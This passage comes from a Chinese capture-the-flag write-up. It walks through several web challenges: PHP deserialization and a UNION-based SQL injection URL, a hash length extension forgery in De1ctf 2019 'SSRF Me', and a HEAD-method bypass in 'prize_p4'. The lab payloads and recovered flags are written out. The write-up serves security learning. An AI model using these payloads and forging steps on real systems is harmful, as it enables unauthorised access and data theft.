    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookies</span>,<span class="title function_ invoke__">time</span>()+<span class="number">60</span>,<span class="string">&#x27;/web/&#x27;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Password Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>forget.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="variable">$forget</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$check</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>]));</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:/web/repass.php?username=<span class="subst">$name</span>&amp;check=<span class="subst">$check</span>&amp;mibao=<span class="subst">$mibao</span>&amp;pass=<span class="subst">$pass</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Get salt Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Please check!!?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先来捋一下思路：riji.php中存在sql注入的点也就是id，但是id在之前被赋值了，有没有办法让他不进入if呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那就是result[‘userid’]结果为空的情况下。</p><p>先利用api.php的一个接口函数从数据库删除我现在登陆的用户，使select * from user where name&#x3D;’$username’查询为空，因为我们一直登陆，所以session会在服务器端保持我们登陆的状态（也就是说服务器端的session不会注销），所以if($_SESSION[‘user’])在注销之前一直为真，所以当我们在数据库中删除我们登陆的用户之后，则使：$id &#x3D; intval($result[‘userid’]); 这里$id成为一个未被初始化的变量，然后就可以被任意覆盖。在common.php中进行变量覆盖。</p><p>在api.php中，如果我们想要删除用户，是需要check&#x3D;&#x3D;&#x3D;1的，里面存在一个考点：hash长度拓展攻击。</p><p>我们先获取一下userid，待会要删除的userid</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115507603.png" alt="image-20250104115507603" style="zoom:80%;" /><p>userid为2</p><p>然后去构造api的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>只有admin用户才能删除用户，那么我们构造如下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$check</span>=<span class="string">&quot;f94ecd6b9856b048313eeb7d0179cb32&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$method</span>=<span class="string">&quot;del_user&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userid</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>这道题salt直接告诉我们了，我们就不需要hash长度拓展攻击了。。。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115941234.png" alt="image-20250104115941234"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiJmOTRlY2Q2Yjk4NTZiMDQ4MzEzZWViN2QwMTc5Y2IzMiI7czo0OiJkYXRhIjtzOjE6IjEiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span><br></pre></td></tr></table></figure><p>然后去api.php删除用户。</p><p>但是我们发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们需要保持登陆状态，那么换个浏览器。。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120856200.png" alt="image-20250104120856200"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28105/api.php?api=Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiJmOTRlY2Q2Yjk4NTZiMDQ4MzEzZWViN2QwMTc5Y2IzMiI7czo0OiJkYXRhIjtzOjE6IjEiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span><br></pre></td></tr></table></figure><p>user删除成功！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120932581.png" alt="image-20250104120932581"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28105/riji.php?id=-1%20union%20select%201,2,(select%20flag%20from%20flag)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120944656.png" alt="image-20250104120944656"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;bea1ea82-0c83-4722-8a89-a41b35a5c119&#125;</span><br></pre></td></tr></table></figure><h2 id="De1ctf-2019-SSRF-Me"><a href="#De1ctf-2019-SSRF-Me" class="headerlink" title="[De1ctf 2019]SSRF Me"></a>[De1ctf 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先理一下思路：最终的flag应该是在result.txt中的，那么就需要触发Task类的Exec方法，在&#x2F;De1ta路由下可以实现，同时action、param、sign可控。Exec方法中有一个checksign方法，这其实就考察到hash长度拓展攻击了。getsign可以获取到一个已知的hash值。</p><p>我们访问&#x2F;geneSign路由可以获取一个hash值，secert_key+scan的哈希值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">checkSign</span>(<span class="built_in">self</span>):</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">getSign</span>(<span class="built_in">self</span>.action, <span class="built_in">self</span>.param) == <span class="built_in">self</span>.sign):</span><br><span class="line">           <span class="keyword">return</span> True</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> False</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">task = <span class="title function_ invoke__">Task</span>(action, param, sign, ip)</span><br><span class="line"><span class="keyword">return</span> json.<span class="title function_ invoke__">dumps</span>(task.<span class="title function_ invoke__">Exec</span>())</span><br></pre></td></tr></table></figure><p>题目给了提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure><p>那么我们接下来的思路是利用scan将flag.txt写入result.txt，同时会print flag.txt的内容，我们先构造这个。</p><p>首先访问&#x2F;geneSign路由，获取secret_key+flag.txt+scan的hash值a95501825b9d23020a8f670b281649fa</p><p>然后在&#x2F;De1ta路由下构造action为scan，param为flag.txt，sign为a95501825b9d23020a8f670b281649fa。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104221216421.png" alt="image-20250104221216421"></p><p>只print了一个状态码。。。突然想起来要print resp.text才行。。那么就需要read了，但是我们能获取的hash值必定带有scan。这时我们突然注意到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if &quot;read&quot; in self.action:</span><br></pre></td></tr></table></figure><p>那么我们可以构造action为scanread</p><p>secret_key+flag.txt+scan的hash值是已知的。</p><p>在&#x2F;De1ta路由下构造action为scanxxxxxxxread，param为flag.txt，进行哈希长度拓展攻击。</p><p>signature:a95501825b9d23020a8f670b281649fa</p><p>data:scan</p><p>key length:24</p><p>data to add:read</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104223600499.png" alt="image-20250104223600499"></p><p>2d970424e20612e377913e4a9ea324af</p><p>scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</p><p>在&#x2F;De1ta路由下构造action为scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</p><p>param为flag.txt，sign为2d970424e20612e377913e4a9ea324af</p><p>发现不行。。。</p><p>重新捋一下思路：</p><p>有read，有scan就可以</p><p>访问&#x2F;geneSign路由，param为flag.txtread</p><p>那么获取secret_key+flag.txt+readscan的hash值523423f97fa7df58aec22413b39fd8f2</p><p>在&#x2F;De1ta路由下构造action为readscan，param为flag.txt不就好了。。。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104224546154.png" alt="image-20250104224546154"></p><p>直接出了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;2ef1cb7c-7d09-49ed-abe6-451e0b4bf48e&#125;</span><br></pre></td></tr></table></figure><p>接下来再回顾一下hash长度拓展攻击，还是得学。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225223289.png" alt="image-20250104225223289"></p><p>成功了，密钥24位，有点不是很清楚，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">len(secert_key) = 16</span><br><span class="line">16 + len(&#x27;scan&#x27;) + len(&#x27;read&#x27;) = 24 = Key Length</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225321393.png" alt="image-20250104225321393"></p><h2 id="prize-p4"><a href="#prize-p4" class="headerlink" title="prize_p4"></a>prize_p4</h2><p>这道题还是比较简单的，我卡在了一个点上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;]) </span><br><span class="line"></span><br><span class="line">def getkey(): </span><br><span class="line">if request.method != &quot;GET&quot;: </span><br><span class="line">session[&quot;key&quot;]=SECRET_KEY</span><br></pre></td></tr></table></figure><p>这里可以用与GET相似的方法HEAD来绕过。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105082600584.png" alt="image-20250105082600584"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,render_template_string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> flag </span><br><span class="line"></span><br><span class="line">SECRET_KEY=<span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(<span class="built_in">dict</span>(</span><br><span class="line">    SECRET_KEY=SECRET_KEY,</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"><span class="comment">#src in /app</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_data&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    data = request.form.get(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">        data=data.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8888/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> 